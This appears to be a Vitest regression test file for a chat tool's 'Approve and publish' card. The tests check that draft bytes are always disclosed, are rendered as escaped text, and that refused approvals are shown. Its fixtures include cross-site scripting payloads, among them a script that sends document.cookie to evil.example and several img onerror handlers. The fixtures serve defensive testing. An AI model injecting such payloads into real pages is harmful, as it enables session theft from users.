// The in-chat "Approve and publish" card, locked as a regression test.
//
// This panel is the gate every chat-initiated Guru push passes through, so two
// things must be true of it no matter what Python concluded:
//
//   1. the exact bytes that will be sent are ALWAYS reachable — a collapsed
//      disclosure that is present for every draft shape, never one that appears
//      only when a warning fires (every detector that has gated this view was
//      later defeated by whoever wrote the payload);
//   2. those bytes render as ESCAPED TEXT — never markup, never a live frame.
//      The content is assumed hostile; that is the whole point of showing it.
//   3. a REFUSED approval says so on this surface. The approval is bound to
//      the bytes the panel rendered (agent_chat's approval fingerprint), and a
//      draft the `revise_draft` chat tool mutated afterwards refuses and
//      publishes nothing. A bare failure is indistinguishable from a Guru
//      outage, and the natural response to an outage is to click again.
import { describe, expect, it } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";
import { DraftCard, ResolveNotice, ReviewPanel } from "./ChatApp.jsx";

const noop = () => {};

const HOSTILE = '<h1>Refund policy</h1>'
  + '<script>steal("https://evil.example/x?c=" + document.cookie)</script>'
  + '<img src="/logo.png" onerror="go(\'//evil.example/steal\')">';

function card(extra) {
  return {
    draft_id: 1, title: "Refund policy", change_count: 2,
    diff: [{ tag: "add", text: "Refund policy" }], checks: [],
    notice: "", publish_body: "", publish_body_available: true, ...extra,
  };
}

function render(extra) {
  return renderToStaticMarkup(
    <DraftCard d={card(extra)} onApprove={noop} onReject={noop} busy={false} />);
}

describe("DraftCard — the exact-bytes disclosure", () => {
  it("is present with NO notice (access does not depend on a detector)", () => {
    const out = render({ notice: "", publish_body: "<p>hello</p>" });
    expect(out).toContain("<details");
    expect(out).toContain("Exact bytes that will be sent");
    expect(out).toContain("&lt;p&gt;hello&lt;/p&gt;");
  });

  it("is present with a notice too, and flags it on the summary", () => {
    const out = render({ notice: "NOT SHOWN ABOVE but WILL be sent",
                         publish_body: HOSTILE });
    expect(out).toContain("Exact bytes that will be sent");
    expect(out).toContain("does not account for them");
    expect(out).toContain("NOT SHOWN ABOVE but WILL be sent");
  });

  it("is CLOSED by default (one header row, the diff keeps the space)", () => {
    const out = render({ publish_body: HOSTILE });
    expect(out).not.toContain("<details open");
    expect(out).not.toMatch(/<details[^>]*open=""/);
    expect(out).toContain("<summary");
  });

  it("renders hostile bytes as ESCAPED TEXT, never as markup", () => {
    const out = render({ publish_body: HOSTILE });
    expect(out).toContain("&lt;script&gt;");
    expect(out).toContain("evil.example");
    expect(out).toContain("document.cookie");
    expect(out).toContain("onerror");
    // nothing live: no executable tag, no frame, no injection sink
    expect(out).not.toContain("<script>steal");
    expect(out).not.toContain("<img src=\"/logo.png\"");
    expect(out).not.toContain("<iframe");
  });

  it("shows a size hint so an empty or truncated body is obvious", () => {
    expect(render({ publish_body: "abcde" })).toContain("5 chars");
    expect(render({ publish_body: "" })).toContain("0 chars");
  });

  it("says the body is unavailable rather than looking like empty bytes", () => {
    const out = render({ publish_body: "", publish_body_available: false });
    expect(out).toContain("unavailable");
    expect(out).toContain("do not approve it");
  });

  it("tolerates a payload with no publish_body key at all", () => {
    const out = renderToStaticMarkup(
      <DraftCard d={{ draft_id: 7, title: "T", change_count: 0, diff: [] }}
                 onApprove={noop} onReject={noop} busy={false} />);
    expect(out).toContain("Exact bytes that will be sent");
  });

  it("still renders the notice as escaped text", () => {
    const out = render({ notice: '<img src=x onerror=alert(1)>' });
    expect(out).toContain("&lt;img");
    expect(out).not.toContain("<img src=x");
  });
});

const STALE = "This draft changed after you reviewed it — nothing was "
  + "published. Re-open the review panel and read the new content before approving.";

describe("ReviewPanel — a refused approval is visible", () => {
  function panel(note) {
    return renderToStaticMarkup(
      <ReviewPanel drafts={[]} open onClose={noop} onApprove={noop}
                   onReject={noop} busyId={null} note={note}
                   onDismissNote={noop} />);
  }

  it("shows the refusal Python sent, verbatim", () => {
    const out = panel({ message: STALE, refused: true });
    expect(out).toContain("changed after you reviewed it");
    expect(out).toContain("nothing was published");
    expect(out).toContain('role="alert"');
  });

  it("shows nothing when there is nothing to say", () => {
    expect(panel(null)).not.toContain("dresolve");
    expect(panel({})).not.toContain("dresolve");
  });

  it("does not invent its own reason for a failure", () => {
    // no message => no banner. The page never reconstructs why a publish did
    // not happen; only Python knows, and only Python says.
    expect(panel({ refused: true })).not.toContain("dresolve");
  });

  it("renders the message as escaped text", () => {
    const out = renderToStaticMarkup(
      <ResolveNotice note={{ message: '<img src=x onerror=alert(1)>' }}
                     onDismiss={noop} />);
    expect(out).toContain("&lt;img");
    expect(out).not.toContain("<img src=x");
  });
});
